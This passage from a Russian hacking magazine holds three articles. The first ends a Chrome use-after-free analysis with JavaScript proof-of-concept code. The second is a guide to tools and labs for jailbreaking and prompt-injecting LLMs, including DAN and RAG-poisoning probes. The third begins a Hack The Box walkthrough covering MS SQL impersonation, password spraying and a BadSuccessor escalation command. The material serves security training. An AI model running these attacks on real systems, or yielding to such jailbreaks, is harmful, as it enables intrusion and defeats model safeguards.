Инструкция mov r8, [rcx] показывает, что процесс пытался считать 8 байт
по адресу rcx. В rcx — все тот же адрес памяти: 000010b4'0024b000 . Выпол‐
ним команду db 000010b4'0024b000 — это команда display bytes . Она
покажет, что именно лежит по указанному адресу. На скрине видна куча зна‐
ков вопроса. Это значит, что процесс уже потерял доступ к этому участку
памяти.





                         Результат выполнения команды db

Команда  !address   00001434'0024b000  выведет  состояние  памяти
на момент обращения:


Usage:                  <unknown>
Base Address:           00001434`0024b000
End Address:            00001434`00258000
Region Size:            00000000`0000d000 (  52.000 kB)
State:                  00002000          MEM_RESERVE
Protect:                <info not present at the target>
Type:                   00020000          MEM_PRIVATE
Allocation Base:        00001430`00000000
Allocation Protect:     00000001          PAGE_NOACCESS

Как видишь, участок памяти свободен и к нему нет доступа. Но адрес был
в указателе, значит, ранее он принадлежал процессу.
  В крашнутом процессе без проблем можно найти все указатели, связан‐
ные с HashMap. Поинтер aliases_ указывает на саму HashMap. Поинтеры
m_position и m_endPosition указывают на текущую позицию и конец списка.
Выполняем


s -q 0 L?0x7fffffffffffffff 00001434`0024b000

Команда ищет адрес памяти в виде 64-битного числа. Результат будет таким:


00007cd4`0040c8e0  00001434`0024b000 00001434`0024a700

Для каждого адреса выполняем !address  00... . Смотрим на значение
State , получаем следующие состояния:
 • aliases_ — в состоянии MEM_COMMIT . HashMap жива, Blink переместил
   ее при рехеше;
 • m_position — это тот самый адрес, где произошел краш. Состояние —
  MEM_RESERVE ;
 • m_endPosition находится в состоянии MEM_COMMIT , но только потому,
   что итератор еще не дошел до этой позиции. При выполнении .next() дан‐
  ные    читаются    по    адресу   m_position ,    что    приводит
   к ACCESS_VIOLATION . На самом деле эта страница памяти тоже уже была
   освобождена.


РАЗБИРАЕМ АТАКУ

Уязвимость касается CSS @font-feature-values , поэтому начинаем с соз‐
дания стиля и помещаем в него любой набор @styleset.


const style = document.createElement("style");
document.head.appendChild(style);


style.sheet.insertRule(`
@font-feature-values POC {
  @styleset { a:1; b:2; c:3; d:4; }
}`, 0);

Как именно мы создадим стиль, не играет роли. Можно прописать его
в хедере  страницы,  указать id и  получить  элемент через document.
getElementById() . Ключевое — наличие стиля и набора «ключ — значение».
При   парсинге   этого  набора   Blink  выделил   память  и   создал
FontFeatureAliases . Указатель пока не создан.
   Получаем наш стайлсет — через него мы добьемся рехеша:


const map = style.sheet.cssRules[0].styleset;

Создаем итератор на JavaScript:


const it = map.entries();

В Blink функция .entries() означает, что нужно инициализировать итератор:
iterator_  =  aliases_->begin() . С этого момента указатель «заморо‐
жен» — он смотрит на текущий внутренний буфер HashMap .
   Теперь надо добиться рехеша, чтобы Blink перенес структуру в новую
область памяти и освободил старую. Это можно сделать через метод .set() .
Для надежности можем добавить в код удаление ключей через map.delete(
) , тогда Blink точно выполнит хотя бы один рехеш. Но работать будет и так:
большим диапазоном (512) мы гарантируем, что структура выйдет за пределы
выделенной памяти.


for (let i = 0; i < 512; i++) {
  map.set("k" + i, i);
}

Каждый set() уходит в C++ через функцию CSSFontFeatureValuesMap::
set() , которая мутирует FontFeatureAliases . После первого же рехеша
указатель aliases_ в итераторе становится висячим.
   Итератор it  смотрит на  старую  область  памяти,  так  как мы  его
не обновляли. Сам map Blink уже перенес в другую область памяти. По идее,
любой вызов .next() крашнет таб, но для надежности запустим цикл:


while (true) {
  const r = it.next();
  if (r.done) break;
}

Я тестировал в Windows. В других средах код может вести себя по‑другому.
Для повышения  надежности  есть  несколько  подходов. Если наш цикл
для вызова рехеша не сработал, делаем его жестче:


while (count < 20) {
    iterator.next();
    map.delete(key);
    for (i = 0; i < 512; i++)
        map.set("k" + i, [i]);
}

Метод .delete() триггерит рехеш, а .set() — реаллокацию. Двойной удар,
чтобы наверняка получить висячий указатель.
   Попробуем обойтись без явного создания итератора через entries() .
Выполним обход в цикле for (const [k, v] of map) { ... } . В теле цик‐
ла — те же .set() и .delete() .


ЗАКЛЮЧЕНИЕ

Если ты не занимался коммерческой разработкой приложений, может воз‐
никнуть вопрос: а зачем вообще использовать указатели, раз они такие неж‐
ные и могут представлять угрозу? Разработчикам постоянно нужно балан‐
сировать между производительностью и безопасностью. Никто не захочет
пользоваться очень безопасным, но крайне медленным браузером.
   Команда Google решила проблему радикально — заменила сырой ука‐
затель полной копией объекта:


- const FontFeatureAliases* aliases_;   // raw pointer → dangling
after rehash
+ const FontFeatureAliases aliases_;    // deep copy → immune to
rehash

Теперь  при  создании  итератора  выполняется  глубокое  копирование
HashMap, поэтому последующие мутации оригинала не ломают итератор.
В рамках одного правила CSS это не сильно повлияет на производительность
в небольших проектах. Но в крупных веб‑приложениях, где огромное количес‐
тво JS-кода и стилей CSS, могут появиться заметные просадки. Если мутаций
много и итераторы создаются часто, нагрузка на ресурсы накапливается.
   Команда Google просто переложила заботу о производительности на раз‐
работчиков, но при этом  значительно  лучше  защитила  пользователей.
Рабочие эксплоиты для разных систем есть у коммерческих spyware-вен‐
доров, например NSO Group (разработчики Pegasus) и  Intellexa (авторы
Predator), а также у хакерских группировок вроде Fancy Bear и APT28.
   Рабочий эксплоит для разных систем есть у NSO Pegasus, Intellexa Predator
и Fancy Bear. Полная цепочка эксплуатации описывается так:


Renderer RCE (CVE-2026-2441)
    → Mojo IPC exploit → Browser process RCE
        → Kernel exploit → Full system compromise
            → Malware / ransomware / spyware installation
            → File system access, lateral movement, persistence

Но это уже совсем другая история. © X
ВЗЛОМ





Сегодня с ноги вломимся в мир пентеста
ИИ. Я нашел для тебя  классные  тулзы
для  автоматического тестирования  боль‐
ших   языковых  моделей  и   несколько                                                                                         ret0x2A
                                                                                            @ret0x2Aотличных  лабораторных работ,  чтобы ты
мог отработать навыки как  автоматичес‐
кого, так и ручного тестирования нейронок.


Процесс тестирования ИИ больше похож на социальную инженерию, чем
на технический взлом. Как телефонный мошенник убеждает жертву перевести
деньги на «безопасный счет», так и хакер убеждает нейросеть «безопасно»
показать секретные данные.
   Автоматизация в таких условиях должна быть построена тонко. Пришлось
хорошенько  покопаться,  чтобы  найти  достойные  инструменты.  Кроме
эффективности, я ориентировался еще на два требования: инструмент дол‐
жен быть бесплатным, в том числе работать без подписок на нейросети; тре‐
бования к ресурсам компьютера должны быть минимальными. Не все сидят
на топовом железе и могут свободно запускать несколько нейросетей — одну
для теста, еще одну или несколько для атак.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



ТЕСТОВЫЕ СРЕДЫ

Какой смысл в тулзах, если их нельзя сразу использовать? Я подготовил нес‐
колько вариантов тестового стенда, которые ты сможешь развернуть прямо
на своей машине.
  Для тестов в статье будем использовать интерактивную песочницу DVAIA .
Приложение похоже на DVWA, но специально создано для обучения атакам
на LLM- и RAG-системы. Оно рассчитано на ручное тестирование, но какая,
в сущности, разница?


             INFO

                  RAG (Retrieval-Augmented Generation, «генерация,
                         дополненная поиском») — это технология, улуч‐
                   шающая ответы LLM (языковых моделей) за счет
                            предоставления им актуальных внешних данных.
                         Система ищет релевантную информацию в базе
                          знаний (документах, базах данных) и подставляет
                       ее  в  запрос модели,  что  повышает  точность
                      и снижает количество галлюцинаций.


DVAIA базируется на Ollama, работает локально, нет нужды подключать
какие‑то API. Но тебе потребуется современный процессор, который под‐
держивает  инструкции AVX2. Оперативной памяти — минимум 8 Гбайт,
но лучше 16 Гбайт. Понадобится и место на диске. Ну а наличие GPU зна‐
чительно ускорит работу. Чем хуже твои железяки, тем медленнее работает
нейронка и тем больше времени нужно на каждый тест.
  Плюс этой лабы — в разнообразном наборе уязвимостей. Есть классичес‐
кая инъекция промпта для отработки джейлбрейков и попыток поднять при‐
вилегии. Секция Document Injection нужна, чтобы ты поработал над своим
навыком атак через загрузку файлов: PDF, DOCX, изображений с OCR. В Web
Injection можешь подложить вредоносный URL. Пробуй RAG и инъекцию через
шаблоны. Коротко — полноценная среда для апа навыков.
   Установка и запуск DVAIA:


git clone https://github.com/genbounty/DVAIA.git
cd DVAIA
sudo ./run-docker.sh

Дождись сообщения success.





Уязвимое приложение доступно по адресу http://127.0.0.1:5000 . Открой
его в  браузере, и  увидишь  полноценное  веб‑приложение,  написанное
на Flask. Уязвимости разбиты по типам, переключение — через левое меню.





                           Веб‑морда DVAIA

Есть и другие лабы и модели, направленные на обучение пентесту ИИ. Если
только  вкатываешься в  тестирование LLM, есть небольшой набор лаб
на PortSwigger. На сегодня их всего четыре, но, пройдя их, получишь базовые
навыки.


DVLA
Попрактиковаться в атаках на чат‑бота можешь в Damn Vulnerable LLM Agent .
Подобный проект использовался как CTF на конференции BSides London
2023. Он построен на архитектуре ReAct (Reasoning + Acting). Запускать лабу
можешь как с подключением к OpenAI, так и с моделями с Hugging Face
или локально с Ollama. Для работы с OpenAI или HF в файл .env пропиши
актуальные ключи API.
   Перед установкой лабы разверни Ollama. Учти, что для DVAIA ты устанав‐
ливал все в виртуальном окружении. DVLA работает в своем виртуальном
окружении. Поэтому придется установить Ollama снова.


git clone https://github.com/ReversecLabs/damn-vulnerable-llm-agent.
git
cd damn-vulnerable-llm-agent/
python3 -m venv env
source env/bin/activate
# Виртуальное окружение создано и активировано, установи Ollama
curl -fsSL https://ollama.com/install.sh | sh
# Проверь версию
ollama --version
ollama pull mistral-nemo
cp .env.ollama.template .env
vim .env

В .env поправь:


model_name="ollama-mistral-nemo"
OLLAMA_HOST=http://localhost:11434

Продолжи установку лабы:


pip install -r requirements.txt
pip install python-dotenv

Запуск лабы:


python -m streamlit run main.py

Скрипт спросит email — введи любой. Приложение автоматически откроется
в браузере.





            Запущенное приложение Damn Vulnerable LLM Agent


Folly
Неплохой вариант для тренировки навыков — Folly. Это инструмент для тес‐
тирования устойчивости LLM к инъекциям промптов и джейлбрейкам. Он пос‐
троен вокруг библиотеки заданий, вроде «извлечь секрет SECRET123».
  К Folly подключается любая модель — напрямую или через API. Собствен‐
ной LLM нет. Берешь и тестируешь реальную живую модель, пытаешься ее
взломать. Для этого у Folly есть свой UI в вебе, CLI и API. Например, старень‐
кая Llama подойдет идеально.
    Установка:


git clone https://github.com/user1342/folly.git
cd folly
pip install -e .


GARAK

Это опенсорсный фреймворк, разработанный в Nvidia. В арсенале Garak
более 50 классов атак (prompt injection, jailbreak, hallucination, toxicity и про‐
чие), включающих более 160 проб. Много детекторов для оценки успешности
атаки. При тестировании применяются многократные запросы, что позволяет
убедиться в надежности обнаруженной уязвимости.
   Инструмент свободно встраивается в CI/CD и твои проекты, написанные
на Python. Если тебе недостаточно существующих наборов проб, пиши
свои — у фреймворка расширяемая  архитектура, и по существующему
образцу легко написать собственные наборы тестов.
    Установка:


python3 -m venv garak-venv
source garak-venv/bin/activate
pip install garak

Garak поддерживает разные виды моделей: OpenAI, Azure, Ollama, Hugging
Face и множество других. Используй garak --list_generators , чтобы уви‐
деть полный список. Но для тестирования DVAIA эти варианты не подходят,
даже Ollama. Используй тип rest и конфигурационный файл с описанием
запроса. Создай файл dvaia_garak.json с конфигом под лабу:


{
  "rest": {
    "RestGenerator": {
      "name": "DVAIA direct injection",
      "uri": "http://127.0.0.1:5000/api/chat",
      "method": "post",
      "headers": { "Content-Type": "application/json" },
      "req_template_json_object": { "prompt": "$INPUT" },
      "response_json": true,
      "response_json_field": "response",
      "request_timeout": 60
    }
  }
}

Большинство    свойств    интуитивно    понятны.    Обрати    внимание
на req_template_json_object и response_json_field. Эти свойства опи‐
сывают, куда в запросе подставлять промпт и в каком поле ответа искать
текст нейросети. Вместо prompt может быть message или другое поле. Вмес‐
то response — какой‑нибудь text . Для приложения DVAIA я подсмотрел зна‐
чения через DevTools браузера. Жми F12, переходи на вкладку Network
и отправляй любое сообщение нейронке. В списке запросов найди POST
и смотри названия полей на вкладках Request и Response.





Для локального тестирования, особенно на слабых машинах, обязательно
указывай параметр request_timeout. Стандартный тайм‑аут — 20 с. Его дос‐
таточно, если работаешь с мощным быстрым API или на хорошем железе.
В ином случае через пару‑тройку реквестов получишь ошибку по тайм‑ауту.
Она очень бесит, особенно после сотни проверок и часов, потраченных
на них.





                    Ошибка превышения тайм‑аута

Запуск теста:


garak --target_type rest -G dvaia_garak.json --probes dan.Dan_11_0
--parallel_attempts 1 --parallel_requests 1

Параметром --target_type указываешь модель таргета. В нашем случае
это REST API. Через -G передаешь JSON-файл конфига. Какие атаки исполь‐
зовать — пиши в --probes . В примере использую пробы DAN_11_0 из генера‐
тора dan. Это запуск с минимальным количеством проверок, чтобы тест про‐
шел быстро. Можешь не указывать конкретные пробы, а только сам dan, тогда
Garak пройдется по всем входящим в генератор вариациям.
   DAN-атака (Do Anything Now) — это классический пример джейлбрейка.
С помощью специально созданного запроса мы пытаемся заставить модель
игнорировать встроенные правила. Например, уговорить ИИ написать экс‐
плоит.
   Атака не всегда текстовая. Инструкция может быть написана на листке
бумаги. Фото листка отправляешь нейронке, и она не замечает подвоха, ведь
инструкция получена не от пользователя, и обрабатывает текст без цензуры.
   Чтобы понять, что такое DAN_11_0 и как работают генераторы проб, смот‐
ри исходники. Чтобы их найти, пишем:


grep -r --include="*.py" "import garak.probes" <garak_folder_path>





                        Исходники с коллекциями проб

Не хватает стандартного набора генераторов? По образцу можешь создать
собственный.  Подробнее  смотри  в  документации ,  я  бегло  пройдусь
по основным моментам.
   Каждый генератор состоит из нескольких классов. Главный — это метак‐
ласс, описывающий, как создается конкретный тестовый запрос к ИИ. Запус‐
ти атаку, и увидишь, что для каждого типа проб генерируется по пять зап‐
росов. За эту генерацию отвечает метакласс. На примере dan метакласс
называется DANProbeMeta. Дальше идет целый набор классов, описывающих
конкретные типы промптов.





                           Метакласс DANProbeMeta

Конкретные датасеты лежат в файлах JSON. Внутри файлов — массив
с промптами, содержащими макросы для подстановки. Например: garak/
data/dan/Dan_11_0.json .





                  Содержимое датасета в dan_11_0_json

Программа обходит массив, заменяет макросы конкретными значениями
для теста и возвращает готовый промпт. Каждый шаблон из массива исполь‐
зуется несколько раз. Это нужно, чтобы избежать ошибок и быть уверенным
в результате. Нейросеть на один и тот же запрос может выдавать разные
ответы, поэтому Garak должен убедиться в наличии уязвимости. Выполни
прогон, чтобы сгенерировать отчет и увидеть конкретные промпты.





                                Работа Garak

Прогон по DAN_11_0 показал, что приложение DVAIA абсолютно уязвимо. Все
тесты Ollama провалила. По итогам тестирования Garak дал ссылку на отчет.
В нем увидишь запросы и ответы нейронки.





                        Garak нашел уязвимости





                Пример, когда Garak не нашел уязвимостей


PROMPTFOO

Эта утилита умеет анализировать безопасность, промпты и исходные коды.
Есть более 40 встроенных проверок: toxicity, PII, hallucination, SSRF и прочие.
Есть режим сравнения нескольких моделей или промптов.
   Есть платная и комьюнити‑версия. В статье использую бесплатную вер‐
сию. В целом  платная  версия  нужна больше командам  разработчиков
или пентестеров, а для экспериментов или работы в лайтовом режиме дос‐
таточно комьюнити‑варианта.
    Запускается с указанием модуля. Пример:


promptfoo redteam poison [...options...] [...flags...]

Эта команда запускает модуль redteam в режиме генерации документа
для RAG-атаки. Есть модуль list , который выводит все справочники, нап‐
ример доступные типы атак. Модуль mcp запускает сервер для интеграций.
Полный   список  модулей   отображается,  если   запустить  promptfoo
без параметров.
   Работать можешь через CLI, используя YAML-конфиги для настройки тар‐
гетов и тестов. Либо через приятный веб‑интерфейс. Web UI стартует авто‐
матически при запуске некоторых модулей; если хочешь просто открыть его
без лишних действий, используй команду promptfoo view .
   Установка и запуск:


npx promptfoo@latest redteam setup

После установки promptfoo в браузере откроется веб‑интерфейс настройки
таргета.  Тулза  использует модули для работы; redteam — это модуль
для атак. Командой setup запускаешь процесс настройки таргета. Не путай
с настройками модуля или самого promptfoo.





Жми Get Started. Укажи, как хочешь назвать таргет. На следующем экране
выбери тип таргета. Прога поддерживает большое количество таргетов, в том
числе OpenAI, Anthropic, AWS Bedrock и другие. Кликни по HTTP/HTTPS
Endpoint, так как работаешь с DVAIA.
   Заполни поля, описывающие запрос и ответ сервера. Большинство зна‐
чений уже есть. В теле запроса измени название поля message на prompt.
Укажи, где парсеру ответа сервера  ( Response Parser) искать ответ ней‐
росети. Весь JSON, который придет в ответе сервера, тулза распарсит
и поместит в объект json . DVAIA возвращает ответ ИИ в поле response ,
в Response Parser пропиши: json.response .





                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИВЗЛОМ
    ЖРЕМ МОЗГИ ИИ
                 ПОДБИРАЕМ ТУЛЗЫ
                  ДЛЯ ПЕНТЕСТА LLM




Когда будешь использовать этот инструмент в работе, могут возникнуть сом‐
нения, правильно ли парсишь ответ нейронки. В окне со строкой для пар‐
синга справа есть серая кнопка Test. Нажми — откроется окно для проверки.
Скопируй JSON-ответ твоей нейронки и вставь в поле Test Response (JSON).
В нижнем поле пиши структуру. Она всегда начинается с json — это объект,
указывающий на весь ответ сервера. Дальше обычное дерево свойств
до нужного тебе. Жми Run Test: если появилось зеленое сообщение о том,
что парсер отработал, значит, все окей.





                       Проверка парсинга JSON-ответа

Нажми  Test  Target,  чтобы  убедиться,  что promptfoo может  достучаться
до DVAIA и корректно работает с полями запроса и ответа.
  В блоке Session Management выбери No: сейчас управление сессиями
тебе не нужно.





                        Настройка деталей приложения

Следующим шагом укажи I’m testing a model, чтобы избежать описания кон‐
текста приложения. Программа может тестировать как модель, так и пол‐
ноценное приложение, которое выполняет четко очерченную задачу. Нап‐
ример, ведет какой‑то документооборот для HR-отдела. Другими словами,
можешь тонко подстроить контекст, чтобы атака была максимально прав‐
доподобной.





                    Выбор плагинов для тестирования

Время указать, какие именно тесты нужны. В promptfoo это делается через
список плагинов. Задача плагина — генерация пейлоада. Есть готовые
наборы вроде OWASP Top 10 for LLM Applications. Либо промотай экран вниз
и поставь галочки напротив нужных плагинов.
   Некоторые проверки надо донастроить, прописав контекст. В списке
справа (Selected Plugins) они будут помечены красным, пока не заполнишь
соответствующие поля. Для тестового запуска это некритичный момент,
поэтому просто жми минус.





                      Настройка стратегии тестирования

Завершающий этап настройки — стратегия доставки пейлоада. Если нажать
Next без выбора  стратегии, пейлоады  отправятся «в лоб» по очереди.
Это вполне рабочий способ, которого хватит для теста DVAIA. В реальном
пентесте у подхода низкая эффективность из‑за топорности, плюс нейронка
может обладать памятью и спалить попытку атаки.
   Стратегия Meta Agent отлично подходит, если таргет работает по принципу
«один вопрос — один ответ». Тулза начнет динамически выстраивать так‐
сономии, учиться на истории предыдущих попыток. Оптимизация будет про‐
исходить на основе того, что сработало или не сработало. Работает мед‐
леннее стратегии «в лоб», но эффективнее.
   Hydra Multi-Turn работает диалогами: атака растягивается на серию сооб‐
щений. Если Meta Agent просто подстраивался под одиночные удачные сооб‐
щения, эта стратегия строится на всей истории общения с таргетом. Под‐
ходит, если это чат‑бот или агент с памятью. По времени самая медленная,
но и результативность выше.





Проверь все настройки, жми Run Now и жди отчета.





Перед первым запуском promptfoo попросит указать почту. Если паришься
по поводу своей анонимности, впиши любое мыло — сканирование нормаль‐
но запустится и отработает.





                          Нужен email для запуска

Если планируешь  периодически выполнять  проверку, сохрани  настройки
в файле YAML. Когда потребуется, запустишь его такой командой:


promptfoo redteam run -c path/to/file.yaml

Пример YAML для DVAIA:


# yaml-language-server: $schema=https://promptfoo.dev/config-schema.
json
description: My Red Team Configuration
targets:
  - id: http
    label: DVAIA
    config:
      url: http://127.0.0.1:5000/api/chat
      method: POST
      headers:
        Content-Type: application/json
      body: '{"prompt":"{{prompt}}"}'
      transformResponse: json.response
      session:
        url: ''
        method: POST
        responseParser: ''
prompts:
  - '{{prompt}}'
redteam:
  purpose: ''
  plugins:
    - id: bias:age  # Age-related bias detection
    - id: bias:disability  # Disability-related bias detection
    - id: bias:gender  # Gender-related bias detection
    # ... много других плагинов ...
    - id: basic  # Original plugin tests without any additional
strategies or optimizations
  numTests: 10
  maxConcurrency: 4
defaultTest:
  options:
    transformVars: '{ ...vars, sessionId: context.uuid }'

По итогам тестирования тулза выдаст сжатую статистику о пройденных и про‐
валенных пробах.





Смотри подробную статистику в меню View Report: последние сканы. Внутри
найдешь, какие пробы LLM не прошла, вплоть до конкретных запросов и отве‐
тов.





Этот инструмент — находка не только для пентестеров, но и для команд раз‐
работчиков. Он без проблем встраивается в CI/CD. Причем не только контро‐
лирует безопасность, но и помогает делать продукт лучше.


AUGUSTUS

Консольная утилита, которая атакует без лишних заморочек. Тебе нужно ука‐
зать, что ты хочешь атаковать, какими наборами атакующих запросов (проб)
пользоваться, и дождаться результата. Прога запускает тысячи запросов.
Ответ проходит через 90+ детекторов, которые подтверждают или отбра‐
сывают найденную уязвимость. Репозиторий проекта Augustus — на GitHub.
    Установка:


go install github.com/praetorian-inc/augustus/cmd/augustus@latest

Бинарь окажется в ~/go/bin/augustus . Добавь в PATH :


export PATH=$PATH:~/go/bin
echo 'export PATH=$PATH:~/go/bin' >> ~/.bashrc

Проверь, что тулза встала и работает:


augustus --help
augustus list   # Выведет все probes, detectors, generators, buffs

Мощная атака на DVAIA, которая использует почти все варианты проб:


augustus scan rest.Rest \
  --probes-glob "dan.*,encoding.*,leakage.*,goodside.*,smuggling.*,
injection.*,continuation.*,divergence.*,lmrc.*,malwaregen.*,
misleading.*,packagehallucination.*" \
  --config '{"uri":"http://127.0.0.1:5000/api/chat","method":"POST",
"headers":{"Content-Type":"application/json"},
"req_template_json_object":{"prompt":"$INPUT"},"response_json":true,
"response_json_field":"response"}' \
  --concurrency 1 \
  --html report.html \
  --verbose

В команде запуска перечислены пробы, которые не требуют подключения
LLM. Подключив Augustus к LLM для генерации запросов, можно значительно
повысить эффективность.





                  В процессе сканирования

Если хочешь указывать пробы по одной, используй параметр --probe . Пиши
--probes-glob , если хочешь перечислить несколько проб через запятую.
   Конфиг очень похож на тот, что использовали с Garak. Тайм‑аута не хва‐
тает, но здесь он задается параметрами: --timeout — ограничение на время
работы всех тестов; --probe-timeout — максимальное время выполнения
одной пробы. Учитывай, что проба не равна запросу. И не забывай про вре‐
менные лаги LLM.
  Я ограничил количество потоков через --concurrency , по умолчанию зна‐
чение — 10 . Если запускать в многопотоке, мое железо не тянет. В DVAIA
летят ошибки, а Augustus считает тест успешным, не получив результата.
Это минус тулзы. Но в целом у большинства сканеров так: чем больше
потоков, тем меньше точность.





                 Отчет о найденных уязвимостях для DAN_11_0


ЗАКЛЮЧЕНИЕ

Мы собрали минимальную рабочую связку: где тренироваться, чем атаковать
и как проверять результат. Это базовый стек для входа в тему. С одной сто‐
роны — уязвимые среды, где можно безопасно ломать систему и понимать,
как именно ведет себя модель при атаке. С другой — инструменты, которые
позволяют автоматизировать проверки и превращать разрозненные тесты
в системный процесс.
   Однако  автоматические сканеры не заменяют  анализ. Они ускоряют
перебор гипотез, но не объясняют, почему атака сработала. Без ручного тес‐
тирования, понимания RAG, поведения агентов и  контекста приложения
результаты легко интерпретировать неправильно.
   Сканеры тебе помогут с небольшими проектами. Но лучше, если ты
будешь внимательно анализировать отчеты и разбираться, почему и как сра‐
батывают атакующие промпты.
   Дальше экспериментируй с тестовыми стендами. Проверь разные типы
атак, сгенерируй документ с помощью promptfoo redteam poison, построй
ручные и автоматические атаки на DVAIA. Пробуй, вникай!
   Если ты дочитал до этого момента, а не просто прокрутил в конец, значит,
тема тебе интересна. Дай знать в комментариях, и продолжим погружаться
в тему атак и защиты ИИ. © X
HACK THE BOX





Сегодня  я  покажу  неочевидный  трюк
повышения    привилегий:    как,   имея
минимальные  права,  можно  через  уяз‐
вимость  BadSuccessor  (CVE-2025-53779)                                                                                         RalfHacker
                                                                                          @RalfHackerChannelсвязать свою dMSA с  администратором
и получить его ключи Kerberos. Перед этим
пройдем базовую цепочку — доступ к MS
SQL, извлечение учетных данных и вход
по WinRM.


Наша цель — получить права суперпользователя на машине Eighteen с учеб‐
ной площадки Hack The Box . Уровень задания — легкий.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                        с применением средств анонимизации и  вир‐
                          туализации. Не делай этого с компьютеров, где
                         есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
На этот раз, помимо IP-адреса машины, нам дают еще и учетные данные
пользователя домена.




                         Информация о машине

Добавляем IP-адрес машины в /etc/hosts :


10.129.16.65    eighteen.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг в любой атаке. Оно поз‐
воляет злоумышленнику узнать, какие службы на хосте принимают соеди‐
нения. На основе этой информации он выбирает следующий шаг, чтобы
получить точку входа.
   Самый  известный  инструмент для  сканирования — Nmap.  Улучшить
результаты его работы поможет следующий скрипт:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он работает в два  этапа. Сначала  запускается быстрое сканирование,
затем — более тщательное, с помощью встроенных скриптов (опция -A ).
   Подробнее про работу с Nmap читай в статье « Nmap с самого начала.
Осваиваем разведку и сканирование сети ».





                             Результат работы скрипта

Сканер нашел три открытых порта:
 • 80 — веб‑сервер Microsoft IIS 10.0;
 • 1433 — СУБД Microsoft SQL Server;
 • 5985 — WinRM.


ТОЧКА ВХОДА

Так как в этот раз нам дали учетные данные, проверим их в двух доступных
службах — MS SQL и WinRM. Это можно сделать с помощью утилиты
NetExec .


nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth


nxc winrm eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!'





                        Результат проверки учетных данных

Подключаемся  к  службе MS SQL с помощью  скрипта mssqlclient.py
из набора Impacket и первым делом проверяем существующие логины и их
права.


mssqlclient.py kevin:'iNa2we6haRj2gaw!'@eighteen.htb


enum_logins





                             Логины в MS SQL

У текущей учетной записи нет прав, поэтому проверим базы данных. Воз‐
можно, получится найти какие‑нибудь полезные учетные данные.


enum_db





                           Базы данных в MS SQL

База данных financial_planner явно должна вызвать интерес, но доступа
к ней у нас нет.


use financial_planner



                      Попытка использования базы данных

Проверим, может ли текущий пользователь выдать себя за другую учетную
запись.


enum_impersonate





                    Проверка прав олицетворения MS SQL

Судя по выводу утилиты, мы можем имперсонировать пользователя appdev.


ТОЧКА ОПОРЫ

Переключаемся в контекст логина appdev и пробуем получить список таблиц
в базе данных financial_planner .


exec_as_login appdev


use financial_planner;
select name from financial_planner.sys.tables;





                     Таблицы в базе financial_planner

В базе данных есть таблица users — в ней, скорее всего, хранятся учетные
данные. Получаем ее содержимое.


select * from users;



                       Содержимое таблицы users

В таблице есть один хеш pbkdf2:sha256. Чтобы перебрать его в hashcat ,
сначала нужно преобразовать его в формат программы. Для этого декоди‐
руем Hex-часть хеша и снова кодируем ее в Base64.





                           Перекодирование хеша

Когда хеш готов, перебираем словарь rockyou.txt.


hashcat
'pbkdf2_sha256$600000$AMtzteQIG7yAbZIa$BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3
F74ozk1myIcTM='
 rockyou.txt





                             Результат подбора пароля

У нас есть учетные данные доменного пользователя, теперь получим список
всех пользователей домена, перебрав RID объектов домена в Microsoft SQL
Server.


nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth
--rid-brute





                              Результат перебора RID

Теперь у нас есть список пользователей, и мы можем с помощью того же
NetExec распылить полученный пароль через WinRM.


nxc winrm eighteen.htb -u users.txt -p iloveyou1




                        Результат подбора учетных данных

Так мы компрометируем еще одну учетную запись, получаем сессию через
WinRM и читаем первый флаг.


evil-winrm -i eighteen.htb -u adam.scott -p iloveyou1




                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Так как нам доступна только служба WinRM, для доступа к другим службам
домена, например LDAP, нужно построить туннель или применить имплант
какого‑нибудь C2. Я буду использовать агент Beacon фреймворка AdaptixC2.





                              Сессия Beacon

Сначала проверим объекты домена, в атрибуты которых текущая учетная
запись может записывать данные.


ldap get-writable





                         Права на объекты домена

В списке видим право на запись в подразделение Active Directory OU=Staff,
DC=eighteen,DC=htb. Посмотрим, какие именно атрибуты учетной записи мы
можем изменить. Из них нас интересует этот:


msDS-DelegatedManagedServiceAccount

Тем более в таблице сессий видно, что здесь используется Windows Server
2025.


ldap get-writable --detailed





                         Права на объекты домена

Эти данные указывают на эксплуатацию уязвимости BadSuccessor (CVE-
2025-53779), которая  позволяет  пользователю с низкими привилегиями
и правами на создание или изменение dMSA сразу повысить привилегии
до администратора домена.
  dMSA (delegated Managed Service Accounts) — это новый тип учетных
записей служб в Windows Server 2025. Они позволяют безопасно управлять
сервисными аккаунтами за счет автоматической ротации паролей и привязки
к конкретным устройствам. Пароли генерируются автоматически, и получить
их не могут даже администраторы. dMSA расширяют возможности gMSA
(group Managed Service Accounts), добавляя device-bound-аутентификацию:
только машины, указанные в атрибуте могут получить пароль dMSA из Active
Directory:


PrincipalsAllowedToRetrieveManagedPassword

Уязвимость BadSuccessor заключается в том, что KDC не проверяет, действи‐
тельно ли dMSA связана с целевой учетной записью, когда выдает TGT. Атри‐
бут msDS-DelegatedManagedServiceAccountLink позволяет любому поль‐
зователю с правами WriteDACL/CreateChild на подразделение привязать свою
dMSA к любой учетной записи домена. KDC доверяет этому атрибуту и добав‐
ляет SID, ключи и группы целевой учетной записи в PAC билета для dMSA.
   Первым делом в подразделении Staff создаем учетную запись dMSA
priv_dmsa и связываем ее с администратором домена.


badtakeover "OU=Staff,DC=eighteen,DC=htb" priv_dmsa S-1-5-21-
1152179935-589108180-1989892463-1609 "CN=Administrator,CN=Users,
DC=eighteen,DC=htb" eighteen.htb





                      Создание и связывание dMSA

